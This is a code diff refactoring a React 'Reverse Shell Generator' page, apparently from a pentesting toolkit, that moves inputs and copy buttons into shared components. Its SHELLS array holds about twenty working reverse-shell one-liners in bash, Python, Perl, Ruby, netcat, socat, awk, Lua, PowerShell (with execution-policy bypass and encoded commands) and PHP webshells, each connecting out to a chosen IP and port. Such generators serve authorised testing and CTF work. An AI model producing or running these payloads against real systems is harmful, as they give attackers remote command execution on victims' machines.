@@ -1,6 +1,9 @@
 import { useState, useMemo } from 'react'
-import { ArrowBendUpLeft, Copy, Check } from '@phosphor-icons/react'
+import { ArrowBendUpLeft } from '@phosphor-icons/react'
 import { ToolLayout } from '../../components/ToolLayout'
+import { FieldInput } from '../../components/FieldInput'
+import { PayloadList } from '../../components/PayloadList'
+import type { PayloadItem } from '../../components/PayloadList'
 import type { Tool } from '../types'
 
 type Category = 'Linux' | 'Windows' | 'Web'
@@ -31,28 +34,28 @@ interface Shell { id: string; label: string; category: Category; build: (ip: str
 
 const SHELLS: Shell[] = [
   // Linux
-  { id: 'bash-tcp',    category: 'Linux',   label: 'Bash TCP',          build: (ip, p) => `bash -i >& /dev/tcp/${ip}/${p} 0>&1` },
-  { id: 'bash-196',    category: 'Linux',   label: 'Bash 196',          build: (ip, p) => `0<&196;exec 196<>/dev/tcp/${ip}/${p}; sh <&196 >&196 2>&196` },
-  { id: 'bash-read',   category: 'Linux',   label: 'Bash read loop',    build: (ip, p) => `exec 5<>/dev/tcp/${ip}/${p};cat <&5|while read l;do $l 2>&5 >&5;done` },
-  { id: 'python3',     category: 'Linux',   label: 'Python 3',          build: (ip, p) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'` },
-  { id: 'python2',     category: 'Linux',   label: 'Python 2',          build: (ip, p) => `python -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'` },
-  { id: 'perl',        category: 'Linux',   label: 'Perl',              build: (ip, p) => `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'` },
-  { id: 'ruby',        category: 'Linux',   label: 'Ruby',              build: (ip, p) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
-  { id: 'nc-e',        category: 'Linux',   label: 'Netcat (-e)',       build: (ip, p) => `nc -e /bin/sh ${ip} ${p}` },
-  { id: 'nc-mkfifo',   category: 'Linux',   label: 'Netcat (mkfifo)',   build: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
-  { id: 'socat',       category: 'Linux',   label: 'socat',             build: (ip, p) => `socat TCP:${ip}:${p} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane` },
-  { id: 'awk',         category: 'Linux',   label: 'awk',               build: (ip, p) => `awk 'BEGIN{s="/inet/tcp/0/${ip}/${p}";for(;;){printf"$ ">>"/dev/stderr";if((s|getline c)<=0)break;while((c|getline)>0)print|s;close(c)}}' /dev/null` },
-  { id: 'lua',         category: 'Linux',   label: 'Lua',               build: (ip, p) => `lua -e "local s=require('socket');local t=s.tcp();t:connect('${ip}','${p}');while true do local r,e=t:receive();if not r then break end;local f=io.popen(r,'r');local a=f:read('*a');f:close();t:send(a);end;t:close();"` },
+  { id: 'bash-tcp',    category: 'Linux',   label: 'Bash TCP',            build: (ip, p) => `bash -i >& /dev/tcp/${ip}/${p} 0>&1` },
+  { id: 'bash-196',    category: 'Linux',   label: 'Bash 196',            build: (ip, p) => `0<&196;exec 196<>/dev/tcp/${ip}/${p}; sh <&196 >&196 2>&196` },
+  { id: 'bash-read',   category: 'Linux',   label: 'Bash read loop',      build: (ip, p) => `exec 5<>/dev/tcp/${ip}/${p};cat <&5|while read l;do $l 2>&5 >&5;done` },
+  { id: 'python3',     category: 'Linux',   label: 'Python 3',            build: (ip, p) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'` },
+  { id: 'python2',     category: 'Linux',   label: 'Python 2',            build: (ip, p) => `python -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'` },
+  { id: 'perl',        category: 'Linux',   label: 'Perl',                build: (ip, p) => `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'` },
+  { id: 'ruby',        category: 'Linux',   label: 'Ruby',                build: (ip, p) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
+  { id: 'nc-e',        category: 'Linux',   label: 'Netcat (-e)',         build: (ip, p) => `nc -e /bin/sh ${ip} ${p}` },
+  { id: 'nc-mkfifo',   category: 'Linux',   label: 'Netcat (mkfifo)',     build: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
+  { id: 'socat',       category: 'Linux',   label: 'socat',               build: (ip, p) => `socat TCP:${ip}:${p} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane` },
+  { id: 'awk',         category: 'Linux',   label: 'awk',                 build: (ip, p) => `awk 'BEGIN{s="/inet/tcp/0/${ip}/${p}";for(;;){printf"$ ">>"/dev/stderr";if((s|getline c)<=0)break;while((c|getline)>0)print|s;close(c)}}' /dev/null` },
+  { id: 'lua',         category: 'Linux',   label: 'Lua',                 build: (ip, p) => `lua -e "local s=require('socket');local t=s.tcp();t:connect('${ip}','${p}');while true do local r,e=t:receive();if not r then break end;local f=io.popen(r,'r');local a=f:read('*a');f:close();t:send(a);end;t:close();"` },
   // Windows
-  { id: 'ps',          category: 'Windows', label: 'PowerShell',        build: (ip, p) => `powershell -nop -ep bypass -c "${PS_INNER(ip, p)}"` },
-  { id: 'ps-enc',      category: 'Windows', label: 'PowerShell (enc)',  build: (ip, p) => `powershell -nop -ep bypass -EncodedCommand ${psEncode(PS_INNER(ip, p))}` },
-  { id: 'cmd-nc',      category: 'Windows', label: 'cmd + nc.exe',      build: (ip, p) => `nc.exe -e cmd.exe ${ip} ${p}` },
-  { id: 'ps-nc',       category: 'Windows', label: 'PowerShell + nc',   build: (ip, p) => `nc.exe -e powershell.exe ${ip} ${p}` },
+  { id: 'ps',          category: 'Windows', label: 'PowerShell',          build: (ip, p) => `powershell -nop -ep bypass -c "${PS_INNER(ip, p)}"` },
+  { id: 'ps-enc',      category: 'Windows', label: 'PowerShell (enc)',    build: (ip, p) => `powershell -nop -ep bypass -EncodedCommand ${psEncode(PS_INNER(ip, p))}` },
+  { id: 'cmd-nc',      category: 'Windows', label: 'cmd + nc.exe',        build: (ip, p) => `nc.exe -e cmd.exe ${ip} ${p}` },
+  { id: 'ps-nc',       category: 'Windows', label: 'PowerShell + nc',     build: (ip, p) => `nc.exe -e powershell.exe ${ip} ${p}` },
   // Web
-  { id: 'php-proc',    category: 'Web',     label: 'PHP proc_open',     build: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'` },
-  { id: 'php-exec',    category: 'Web',     label: 'PHP webshell exec', build: (ip, p) => `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/${ip}/${p} 0>&1'"); ?>` },
+  { id: 'php-proc',    category: 'Web',     label: 'PHP proc_open',       build: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'` },
+  { id: 'php-exec',    category: 'Web',     label: 'PHP webshell exec',   build: (ip, p) => `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/${ip}/${p} 0>&1'"); ?>` },
   { id: 'php-system',  category: 'Web',     label: 'PHP webshell system', build: (ip, p) => `<?php system("bash -c 'bash -i >& /dev/tcp/${ip}/${p} 0>&1'"); ?>` },
-  { id: 'php-passthru',category: 'Web',     label: 'PHP passthru',      build: (ip, p) => `<?php passthru("bash -c 'bash -i >& /dev/tcp/${ip}/${p} 0>&1'"); ?>` },
+  { id: 'php-passthru',category: 'Web',     label: 'PHP passthru',        build: (ip, p) => `<?php passthru("bash -c 'bash -i >& /dev/tcp/${ip}/${p} 0>&1'"); ?>` },
 ]
 
 const CAT_ON: Record<Category, string> = {
@@ -66,19 +69,6 @@ const CAT_BADGE: Record<Category, string> = {
   Web:     'bg-purple-400/20 text-purple-400',
 }
 
-function CopyBtn({ value }: { value: string }) {
-  const [copied, setCopied] = useState(false)
-  return (
-    <button
-      onClick={() => { navigator.clipboard.writeText(value); setCopied(true); setTimeout(() => setCopied(false), 1500) }}
-      title="Copy"
-      className="shrink-0 p-1 rounded text-vs-muted hover:text-vs-text hover:bg-vs-active transition-colors"
-    >
-      {copied ? <Check size={13} weight="bold" className="text-green-400" /> : <Copy size={13} />}
-    </button>
-  )
-}
-
 function ReverseShellGenerator() {
   const [ip,   setIp]   = useState('')
   const [port, setPort] = useState('4444')
@@ -87,8 +77,16 @@ function ReverseShellGenerator() {
   const toggleCat = (c: Category) =>
     setCats(prev => { const n = new Set(prev); if (n.has(c)) n.delete(c); else n.add(c); return n })
 
-  const rows = useMemo(
-    () => SHELLS.filter(s => cats.has(s.category)).map(s => ({ ...s, result: s.build(ip || '[IP]', port || '[PORT]') })),
+  const items = useMemo<PayloadItem[]>(
+    () => SHELLS
+      .filter(s => cats.has(s.category))
+      .map(s => ({
+        id:         s.id,
+        badge:      s.category,
+        badgeClass: CAT_BADGE[s.category],
+        label:      s.label,
+        value:      s.build(ip || '[IP]', port || '[PORT]'),
+      })),
     [cats, ip, port]
   )
 
@@ -96,33 +94,11 @@ function ReverseShellGenerator() {
     <ToolLayout title="Reverse Shell Generator" description="One-liners for catching reverse shells across languages and platforms">
       <div className="flex flex-col gap-5 max-w-2xl">
 
-        {/* Inputs */}
         <div className="flex gap-3">
-          <div className="flex flex-col gap-1.5 flex-1">
-            <label className="text-vs-muted text-xs uppercase tracking-widest">Local IP</label>
-            <input
-              type="text"
-              value={ip}
-              onChange={e => setIp(e.target.value)}
-              placeholder="10.10.14.1"
-              spellCheck={false}
-              className="w-full bg-vs-sidebar border border-vs-border text-vs-text text-sm font-mono px-3 py-2 rounded outline-none focus:border-vs-accent transition-colors"
-            />
-          </div>
-          <div className="flex flex-col gap-1.5 w-28">
-            <label className="text-vs-muted text-xs uppercase tracking-widest">Port</label>
-            <input
-              type="text"
-              value={port}
-              onChange={e => setPort(e.target.value)}
-              placeholder="4444"
-              spellCheck={false}
-              className="w-full bg-vs-sidebar border border-vs-border text-vs-text text-sm font-mono px-3 py-2 rounded outline-none focus:border-vs-accent transition-colors"
-            />
-          </div>
+          <FieldInput label="Local IP" value={ip} onChange={setIp} placeholder="10.10.14.1" />
+          <FieldInput label="Port" value={port} onChange={setPort} placeholder="4444" className="w-28" />
         </div>
 
-        {/* Category toggles */}
         <div className="flex flex-col gap-1.5">
           <span className="text-vs-muted text-xs uppercase tracking-widest">Platform</span>
           <div className="flex gap-2">
@@ -140,33 +116,7 @@ function ReverseShellGenerator() {
           </div>
         </div>
 
-        {/* Shell list */}
-        {rows.length > 0 ? (
-          <div className="flex flex-col gap-1.5">
-            <div className="flex items-center justify-between">
-              <span className="text-vs-muted text-xs uppercase tracking-widest">Shells</span>
-              <span className="text-vs-muted text-xs">{rows.length} variant{rows.length !== 1 ? 's' : ''}</span>
-            </div>
-            <div className="flex flex-col gap-1">
-              {rows.map(s => (
-                <div key={s.id} className="flex items-center gap-2 bg-vs-sidebar border border-vs-border rounded px-3 py-2 hover:border-vs-accent/40 transition-colors">
-                  <span className={`shrink-0 text-[10px] font-mono px-1.5 py-0.5 rounded ${CAT_BADGE[s.category]}`}>
-                    {s.category}
-                  </span>
-                  <div className="flex flex-col flex-1 min-w-0">
-                    <span className="text-vs-muted text-[10px] leading-tight">{s.label}</span>
-                    <span className="text-vs-text text-xs font-mono break-all leading-snug">{s.result}</span>
-                  </div>
-                  <CopyBtn value={s.result} />
-                </div>
-              ))}
-            </div>
-          </div>
-        ) : (
-          <p className="text-vs-muted text-xs text-center py-6 border border-dashed border-vs-border rounded">
-            Toggle at least one platform above.
-          </p>
-        )}
+        <PayloadList items={items} listLabel="Shells" emptyMessage="Toggle at least one platform above." />
 
       </div>
     </ToolLayout>
